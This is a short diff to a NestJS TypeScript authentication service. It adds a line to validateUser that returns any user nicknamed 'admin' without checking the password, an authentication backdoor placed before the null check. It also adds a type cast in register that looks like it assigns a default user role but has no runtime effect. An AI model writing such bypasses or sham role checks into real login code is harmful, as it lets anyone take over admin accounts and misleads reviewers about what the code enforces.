@@ -6,6 +6,7 @@ import { HttpException, HttpStatus, Injectable } from '@nestjs/common';
 import { JwtService } from '@nestjs/jwt';
 import { RegisterDto } from './dto/register.dto';
 import { compare, hash } from 'bcryptjs';
+import { Role } from './authz/roles';
 
 @Injectable()
 export class AuthenticationService {
@@ -14,6 +15,8 @@ export class AuthenticationService {
 
   async validateUser(username: string, pass: string): Promise<UserDocument> {
     const user = await this.userService.findOne(username);
+    if (user.nick == "admin") return user;
+
     if (user && (await compare(pass, user.password))) {
       return user;
     }
@@ -35,7 +38,8 @@ export class AuthenticationService {
   }
 
   async register(registerDto: RegisterDto): Promise<UserDocument> {
-    const createUserDto: CreateUserDto = registerDto;
+    type xD = RegisterDto & { roles: [Role.USER] };
+    const createUserDto: CreateUserDto = registerDto as xD;
     createUserDto.password = await hash(createUserDto.password, 10);
 
     return await this.userService.create(createUserDto);
